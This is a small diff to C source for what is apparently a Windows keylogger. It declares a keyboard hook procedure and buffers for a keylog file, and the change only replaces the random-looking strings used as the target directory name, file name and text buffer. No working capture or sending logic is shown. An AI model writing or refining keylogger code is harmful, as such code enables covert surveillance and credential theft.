@@ -15,9 +15,9 @@ unsigned int TrySymbolMapping(unsigned int VKcode, unsigned int* VKmapNoShift, u
 void TryMetaDataStamp();
 LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
 
-char TargetDirName[14] = "daqwm' 345";
-char TargetFileName[24] = "1445sa asd1 12kj32";
-char TextBuffer[128] = "asda 21 as k[ pcx;] [p1 51df jdfdgl[37 sd";//used to temporarily store some text going to the keylog file
+char TargetDirName[14] = "dsfglkc89326";
+char TargetFileName[24] = "sadf ghhjou65 m32i";
+char TextBuffer[128] = "a[pdq,d as k[ pdgs ]jh 51df dsfdgl[37 sd";//used to temporarily store some text going to the keylog file
 unsigned char SymbolsOnLine;//used to track and limit how many symbols are printed on one line in keylog file
 unsigned char ModifierByte;//holds current state of modifier keys, to detect if a modifier key was newly pressed, or held down
 LastStampInfo_TypeDef LastStampInfo;
